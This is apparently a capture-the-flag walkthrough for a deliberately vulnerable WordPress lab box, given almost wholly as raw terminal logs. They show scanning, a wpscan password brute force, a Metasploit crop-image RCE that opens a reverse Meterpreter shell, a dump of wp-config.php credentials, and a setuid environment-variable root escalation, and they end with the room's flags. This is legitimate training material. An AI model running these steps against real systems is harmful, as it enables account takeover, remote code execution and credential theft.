
***Nmap Scan Find  port***

```
nmap -sC -sV -sS 10.49.170.115                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 13:05 -0400
Nmap scan report for 10.49.170.115
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-06-11T17:05:48
|_  start_date: N/A
|_clock-skew: mean: 12s, deviation: 0s, median: 11s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2026-06-11T17:05:48+00:00


```


```

gobuster dir -u blog.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# Suite 300, San Francisco, California, 94105, USA. (Status: 301) [Size: 0] [--> http://blog.thm/%23%20Suite%20300,%20San%20Francisco,%20California,%2094105,%20USA]
# or send a letter to Creative Commons, 171 Second Street, (Status: 301) [Size: 0] [--> http://blog.thm/%23%20or%20send%20a%20letter%20to%20Creative%20Commons,%20171%20Second%20Street]
rss                  (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 301) [Size: 0] [--> http://blog.thm/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]
0                    (Status: 301) [Size: 0] [--> http://blog.thm/0/]
feed                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
atom                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/atom/]
wp-content           (Status: 301) [Size: 309] [--> http://blog.thm/wp-content/]
welcome              (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
w                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
n                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
rss2                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
wp-includes          (Status: 301) [Size: 310] [--> http://blog.thm/wp-includes/]
no                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
Progress: 1129 / 220559 (0.51%)[ERROR] error on word F: timeout occurred during the request
Progress: 1144 / 220559 (0.52%)[ERROR] error on word stuff: timeout occurred during the request
N                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
W                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
rdf                  (Status: 301) [Size: 0] [--> http://blog.thm/feed/rdf/]
Progress: 1603 / 220559 (0.73%)[ERROR] error on word schools: timeout occurred during the request
page1                (Status: 301) [Size: 0] [--> http://blog.thm/]
Welcome              (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
'                    (Status: 301) [Size: 0] [--> http://blog.thm/]
dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
note                 (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
we                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
2020                 (Status: 301) [Size: 0] [--> http://blog.thm/2020/]
wp-admin             (Status: 301) [Size: 307] [--> http://blog.thm/wp-admin/]
0000                 (Status: 301) [Size: 0] [--> http://blog.thm/0000/]
embed                (Status: 301) [Size: 0] [--> http://blog.thm/embed/]
NO                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
Oasis - 'Definitely Maybe' (Status: 301) [Size: 0] [--> http://blog.thm/Oasis%20-%20%27Definitely%20Maybe]
not                  (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
!                    (Status: 301) [Size: 0] [--> http://blog.thm/]
wel                  (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
yahoo!               (Status: 301) [Size: 0] [--> http://blog.thm/yahoo]
Check Screenshots!   (Status: 301) [Size: 0] [--> http://blog.thm/Check%20Screenshots]
Check All Tracker Features! (Status: 301) [Size: 0] [--> http://blog.thm/Check%20All%20Tracker%20Features]
No                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
Bling!               (Status: 301) [Size: 0] [--> http://blog.thm/Bling]
Welcome!             (Status: 301) [Size: 0] [--> http://blog.thm/Welcome]
server-status        (Status: 403) [Size: 273]
b00g!                (Status: 301) [Size: 0] [--> http://blog.thm/b00g]
party!               (Status: 301) [Size: 0] [--> http://blog.thm/party]
leeches!             (Status: 301) [Size: 0] [--> http://blog.thm/leeches]
Mac Fishin!!!        (Status: 301) [Size: 0] [--> http://blog.thm/Mac%20Fishin]
i deep throat in a thong! (Status: 301) [Size: 0] [--> http://blog.thm/i%20deep%20throat%20in%20a%20thong]
new!                 (Status: 301) [Size: 0] [--> http://blog.thm/new]
Naked Gymnastics - This Is How It Should Always Be! (Status: 301) [Size: 0] [--> http://blog.thm/Naked%20Gymnastics%20-%20This%20Is%20How%20It%20Should%20Always%20Be]                                                                                                                                                      
nada!                (Status: 301) [Size: 0] [--> http://blog.thm/nada]
Q Are We Not Men A We Are Devo! (Status: 301) [Size: 0] [--> http://blog.thm/Q%20Are%20We%20Not%20Men%20A%20We%20Are%20Devo]

```


```
msf auxiliary(scanner/http/wordpress_scanner) > show options

Module options (auxiliary/scanner/http/wordpress_scanner):

   Name                 Current Setting                             Required  Description
   ----                 ---------------                             --------  -----------
   EXPLOITABLE          true                                        no        Only scan plugins and themes which a MSF module exists for
   EXPLOITABLE_PLUGINS  /usr/share/metasploit-framework/data/wordl  yes       File containing exploitable by MSF plugins
                        ists/wp-exploitable-plugins.txt
   EXPLOITABLE_THEMES   /usr/share/metasploit-framework/data/wordl  yes       File containing exploitable by MSF themes
                        ists/wp-exploitable-themes.txt
   PLUGINS              true                                        no        Detect plugins
   PLUGINS_FILE         /usr/share/metasploit-framework/data/wordl  yes       File containing plugins to enumerate
                        ists/wp-plugins.txt
   PROGRESS             1000                                        yes       how often to print progress
   Proxies                                                          no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxie
                                                                              s: socks5, http, socks5h, sapni, socks4
   RHOSTS                                                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                                                              cs/using-metasploit.html
   RPORT                80                                          yes       The target port (TCP)
   SSL                  false                                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI            /                                           yes       The base path to the wordpress application
   THEMES               true                                        no        Detect themes
   THEMES_FILE          /usr/share/metasploit-framework/data/wordl  yes       File containing themes to enumerate
                        ists/wp-themes.txt
   THREADS              1                                           yes       The number of concurrent threads (max one per host)
   USERS                true                                        no        Detect users with API
   VHOST                                                            no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/wordpress_scanner) > set rhost 10.49.170.115
rhost => 10.49.170.115
msf auxiliary(scanner/http/wordpress_scanner) > set threads 5
threads => 5
msf auxiliary(scanner/http/wordpress_scanner) > run
[*] Trying 10.49.170.115
[+] 10.49.170.115 - Detected Wordpress 5.0
[*] 10.49.170.115 - Enumerating Themes
[*] 10.49.170.115 - Progress  0/3 (0.0%)
[*] 10.49.170.115 - Finished scanning themes
[*] 10.49.170.115 - Enumerating plugins
[*] 10.49.170.115 - Progress   0/76 (0.0%)
[*] 10.49.170.115 - Finished scanning plugins
[*] 10.49.170.115 - Searching Users
[+] 10.49.170.115 - Detected user: Billy Joel with username: bjoel
[+] 10.49.170.115 - Detected user: Karen Wheeler with username: kwheel
[*] 10.49.170.115 - Finished scanning users
[*] 10.49.170.115 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/wordpress_scanner) > back
msf > search type:auxiliary wp


```

```
wpscan --url http://blog.thm --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.49.187.220]
[+] Started: Thu Jun 11 14:59:18 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===============================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                                                                
Trying kwheel / westham Time: 00:01:36 <                                                                             > (2865 / 14347257)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jun 11 15:01:05 2026
[+] Requests Done: 3037
[+] Cached Requests: 7
[+] Data Sent: 1.466 MB
[+] Data Received: 2.006 MB
[+] Memory used: 304.074 MB
[+] Elapsed time: 00:01:46

```


```

msf exploit(multi/http/wp_crop_rce) > set lhost 192.168.128.61
lhost => 192.168.128.61
msf exploit(multi/http/wp_crop_rce) > run
[*] Started reverse TCP handler on 192.168.128.61:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (45739 bytes) to 10.49.187.220
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (192.168.128.61:4444 -> 10.49.187.220:58142) at 2026-06-11 15:51:00 -0400

meterpreter > ls 
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 08:15:42 -0400  .htaccess
100640/rw-r-----  235    fil   2020-05-27 23:44:26 -0400  .htaccess_backup
100644/rw-r--r--  1109   fil   2026-06-11 15:48:13 -0400  HANuelVECZ.php
100644/rw-r--r--  1109   fil   2026-06-11 15:11:55 -0400  VxdWUCExaM.php
100644/rw-r--r--  1109   fil   2026-06-11 15:45:27 -0400  cXPBZDAhxI.php
100644/rw-r--r--  1114   fil   2026-06-11 15:16:12 -0400  hQANRvFyIK.php
100640/rw-r-----  418    fil   2013-09-24 20:18:11 -0400  index.php
100640/rw-r-----  19935  fil   2020-05-26 11:39:37 -0400  license.txt
100644/rw-r--r--  1109   fil   2026-06-11 15:14:08 -0400  oupLmQYbMO.php
100640/rw-r-----  7415   fil   2020-05-26 11:39:37 -0400  readme.html
100640/rw-r-----  5458   fil   2020-05-26 11:39:37 -0400  wp-activate.php
040750/rwxr-x---  4096   dir   2018-12-06 13:00:07 -0500  wp-admin
100640/rw-r-----  364    fil   2015-12-19 06:20:28 -0500  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 18:11:25 -0400  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 04:58:26 -0500  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-27 23:49:17 -0400  wp-config.php
040750/rwxr-x---  4096   dir   2020-05-25 23:52:32 -0400  wp-content
100640/rw-r-----  3669   fil   2017-08-20 00:37:45 -0400  wp-cron.php
040750/rwxr-x---  12288  dir   2018-12-06 13:00:08 -0500  wp-includes
100640/rw-r-----  2422   fil   2016-11-20 21:46:30 -0500  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 07:52:48 -0400  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 11:39:37 -0400  wp-login.php
100640/rw-r-----  8048   fil   2017-01-11 00:13:43 -0500  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 03:04:39 -0400  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-29 19:10:26 -0400  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 18:12:51 -0400  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 12:31:29 -0400  xmlrpc.php
100644/rw-r--r--  1114   fil   2026-06-11 15:50:01 -0400  zBjfrjpomj.php

meterpreter > getuid
Server username: www-data
meterpreter > shell
Process 2045 created.
Channel 6 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@blog:/var/www/wordpress$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blog:/var/www/wordpress$ pwd
pwd
/var/www/wordpress
www-data@blog:/var/www/wordpress$ cd ..
cd ..
www-data@blog:/var/www$ ls
ls
html  wordpress
www-data@blog:/var/www$ cd wordpress
cd wordpress
www-data@blog:/var/www/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

/* Custom */
/*
define('WP_HOME', '/');
define('WP_SITEURL', '/'); */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/** Custom FS Method */
define('FS_METHOD', 'direct');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;');
define('SECURE_AUTH_KEY',  'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe');
define('LOGGED_IN_KEY',    'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3');
define('NONCE_KEY',        'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm');
define('AUTH_SALT',        'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`');
define('SECURE_AUTH_SALT', '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7');
define('LOGGED_IN_SALT',   '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_');
define('NONCE_SALT',       'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>');


/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
www-data@blog:/var/www/wordpress$ 

```

```

www-data@blog:/home/bjoel$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
www-data@blog:/home/bjoel$ file /usr/sbin/checker
file /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
www-data@blog:/home/bjoel$ ls -l /usr/sbin/checker
ls -l /usr/sbin/checker


```

```
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
www-data@blog:/home/bjoel$ export admin=1
export admin=1
www-data@blog:/home/bjoel$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/home/bjoel# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@blog:/home/bjoel# ls
ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
root@blog:/home/bjoel# cd ../../..
cd ../../..
root@blog:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
root@blog:/# cd root
cd root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
root@blog:/root# ls
ls
root.txt
root@blog:/root# cd ..
cd ..
root@blog:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
root@blog:/# cd home
cd home
root@blog:/home# ls
ls
bjoel
root@blog:/home# cd bjoel
cd bjoel
root@blog:/home/bjoel# ls
ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
root@blog:/home/bjoel# cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
root@blog:/home/bjoel# cd ../../
cd ../../
root@blog:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
root@blog:/# cd media 
cd media
root@blog:/media# ls
ls
usb
root@blog:/media# cd usb
cd usb
root@blog:/media/usb# ls
ls
user.txt
root@blog:/media/usb# cat user.txt
cat user.txt
c8421899aae571f7af486492b71a8ab7
root@blog:/media/usb# pwd
pwd
/media/usb
root@blog:/media/usb# cd ..
cd ..
root@blog:/media# cd ..
cd ..
root@blog:/# cd /var/www/
cd /var/www/
root@blog:/var/www# ls
ls
html  wordpress
root@blog:/var/www# cd wordpress
cd wordpress
root@blog:/var/www/wordpress# ls
ls
HANuelVECZ.php  readme.html           wp-content         wp-settings.php
VxdWUCExaM.php  wp-activate.php       wp-cron.php        wp-signup.php
cXPBZDAhxI.php  wp-admin              wp-includes        wp-trackback.php
hQANRvFyIK.php  wp-blog-header.php    wp-links-opml.php  xmlrpc.php
index.php       wp-comments-post.php  wp-load.php        zBjfrjpomj.php
license.txt     wp-config-sample.php  wp-login.php
oupLmQYbMO.php  wp-config.php         wp-mail.php
root@blog:/var/www/wordpress# cd ..
cd ..
root@blog:/var/www# ls
ls
html  wordpress
root@blog:/var/www# cd html
cd html
root@blog:/var/www/html# ls
ls
index.html
root@blog:/var/www/html# cat /var/www/html/wp-includes/version.php | grep "wp_version"
<ww/html/wp-includes/version.php | grep "wp_version"
cat: /var/www/html/wp-includes/version.php: No such file or directory
root@blog:/var/www/html# cd ../../../../
cd ../../../../
root@blog:/# cat /var/www/html/wp-includes/version.php | grep "wp_version"
cat /var/www/html/wp-includes/version.php | grep "wp_version"
cat: /var/www/html/wp-includes/version.php: No such file or directory
root@blog:/# cat /var/www/                                                
cat /var/www/
cat: /var/www/: Is a directory
root@blog:/# cd wordpress
cd wordpress
bash: cd: wordpress: No such file or directory
root@blog:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
root@blog:/# cd /var/www/wordpress
cd /var/www/wordpress
root@blog:/var/www/wordpress# ls
ls
HANuelVECZ.php  readme.html           wp-content         wp-settings.php
VxdWUCExaM.php  wp-activate.php       wp-cron.php        wp-signup.php
cXPBZDAhxI.php  wp-admin              wp-includes        wp-trackback.php
hQANRvFyIK.php  wp-blog-header.php    wp-links-opml.php  xmlrpc.php
index.php       wp-comments-post.php  wp-load.php        zBjfrjpomj.php
license.txt     wp-config-sample.php  wp-login.php
oupLmQYbMO.php  wp-config.php         wp-mail.php
root@blog:/var/www/wordpress# cat wp-includes
cat wp-includes
cat: wp-includes: Is a directory
root@blog:/var/www/wordpress# 
[*] 10.49.187.220 - Meterpreter session 1 closed.  Reason: Died



```





